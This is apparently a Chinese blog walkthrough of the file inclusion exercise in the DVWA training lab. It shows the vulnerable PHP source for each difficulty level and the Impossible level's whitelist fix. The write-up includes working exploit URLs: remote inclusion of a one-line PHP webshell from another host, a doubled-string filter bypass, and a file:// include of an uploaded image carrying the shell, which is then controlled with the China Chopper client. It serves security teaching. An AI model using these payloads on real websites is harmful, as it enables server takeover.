**目录**

[LOW：](#t0)

[Medium：](#t1)

[High](#t2)

[Impossible](#t3)

* * *

LOW：
----

源代码：

```
<?php      
// The page we wish to display      
$file = $_GET[ 'page' ];      
?>
```


可以看到，low级别的代码对包含的文件没有进行任何的过滤！这导致我们可以进行包含任意的文件。

当我们包含一个不存在的文件 haha.php ，看看会发生什么情况！

[http://127.0.0.1/vulnerabilities/fi/?page=haha.php](http://127.0.0.1/vulnerabilities/fi/?page=haha.php)

可以看到，发生了报错，并且把网站的路径都给暴露出来了。

![](https://img-blog.csdn.net/20181001124024179?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

第一行的那个Warning就是找不到我们指定的haha.php文件，也就是包含不到我们指定的文件，所以Warning。  
而第二行的警告是因为前面没有找到指定文件，所以包含的时候就出警告了。 

我们可以试下是否存在远端包含，在云端搭了一个一句话木马，然后包含该文件看看：

[http://127.0.0.1/vulnerabilities/fi/?page=http://192.168.10.139/xie.php](http://127.0.0.1/vulnerabilities/fi/?page=http://192.168.10.139/xie2.php)

结果发现成功包含了远端的文件。

那么我们就可以利用中国菜刀进行连接了。

![](https://img-blog.csdn.net/2018100115323239?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

Medium：
-------

源代码：

```
<?php      
// The page we wish to display      
$file = $_GET[ 'page' ];      
// Input validation      
$file = str_replace( array( "http://", "https://" ), "", $file );      
$file = str_replace( array( "../", "..\"" ), "", $file );      
?>
```


可以看到，代码使用 str\_replace函数 对http:// 和 https://进行了过滤，防止了远程包含漏洞的产生，也过滤了 ../ 和 ..\\ 防止了进行目录切换的包含。

但是使用 str\_replace 函数进行过滤是很不安全的，因为可以使用双写绕过。例如，我们包含 hthttp://tp://xx 时，str\_replace 函数只会过滤一个 http://  ，所以最终还是会包含到 http://xx 

所以，我们可以试试访问该链接 [http://127.0.0.1/vulnerabilities/fi/?page=hthttp://tp://192.168.10.139/xie.php](http://127.0.0.1/vulnerabilities/fi/?page=http://192.168.10.139/xie2.php)

结果成功包含了远端的文件，所以我们就可以用一句话木马连接了。

相关文章：[DVWA文件上传漏洞High级别](https://blog.csdn.net/qq_36119192/article/details/82904642#High%EF%BC%9A)

High
----

源代码：

```
<?php      
// The page we wish to display      
$file = $_GET[ 'page' ];      
// Input validation      
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {      
    // This isn't the page we want!      
    echo "ERROR: File not found!";      
    exit;      
}      1
?>
```


high级别的代码对包含的文件名进行了限制，必须为 file\* 或者 include.php ，否则会提示Error：File not  found。

于是，我们可以利用 file 协议进行绕过。file协议我们其实并不陌生，当我们用浏览器打开一个本地的文件时

![](https://img-blog.csdn.net/20181001160246194?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

所以我们可以利用file协议进行包含本地的文件。

当我们想包含一句话木马时，必须配合文件上传漏洞，先把一句话木马上传到服务器端，然后再文件包含，用菜刀连接。

我们先把包含一句话木马的图片利用文件上传漏洞上传到服务器端，然后利用文件包含漏洞和file协议包含该漏洞

所以，当我们访问该链接时

[http://127.0.0.1/vulnerabilities/fi/?page=file:///D:/PhpStudy/PHPTutorial/WWW/DVWA/hackable/uploads/1.jpg](http://127.0.0.1/vulnerabilities/fi/?page=file:///D:/PhpStudy/PHPTutorial/WWW/DVWA/hackable/uploads/2.jpg)

可以看到，成功包含了我们上次的一句话木马图片，把该图片当成php文件执行了

![](https://img-blog.csdn.net/20181001161509393?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

然后，我们就可以利用该链接用中国菜刀进行连接了。 

因为这个网站是要登录的，所以我们在菜刀中右键，然后浏览网站，然后登录就可以在菜刀中保持我们的session。然后就可以获取Webshell了。

![](https://img-blog.csdn.net/20180930203033712?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

Impossible
----------

源代码： 

```
<?php      
// The page we wish to display      
$file = $_GET[ 'page' ];       
// Only allow include.php or file{1..3}.php      
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {      
    // This isn't the page we want!      
    echo "ERROR: File not found!";      
    exit;      1
}      1
?>
```


可以看到，impossible级别的代码使用了白名单过滤的方法，包含的文件名只能等于白名单中的文件，所以避免了文件包含漏洞的产生！

### 相关文章：[文件包含漏洞](https://blog.csdn.net/qq_36119192/article/details/82823685)